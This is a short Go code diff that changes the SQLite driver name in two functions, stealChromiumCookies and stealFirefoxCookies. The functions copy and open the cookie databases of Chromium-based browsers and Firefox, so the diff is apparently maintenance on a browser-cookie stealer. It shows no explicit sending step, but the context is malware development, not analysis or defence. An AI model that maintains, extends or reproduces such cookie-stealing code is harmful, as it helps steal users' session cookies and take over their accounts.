@@ -83,7 +83,7 @@ func stealChromiumCookies(userDataPath string, browserName string) string {
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_journal=WAL&_busy_timeout=3000")
+		db, err := sql.Open("sqlite", tmpPath+"?mode=ro&_journal=WAL&_busy_timeout=3000")
 		if err != nil {
 			continue
 		}
@@ -139,7 +139,7 @@ func stealFirefoxCookies(profilesPath string) string {
 		defer os.Remove(tmpPath + "-wal")
 		defer os.Remove(tmpPath + "-shm")
 
-		db, err := sql.Open("sqlite3", tmpPath+"?mode=ro&_busy_timeout=3000")
+		db, err := sql.Open("sqlite", tmpPath+"?mode=ro&_busy_timeout=3000")
 		if err != nil {
 			continue
 		}
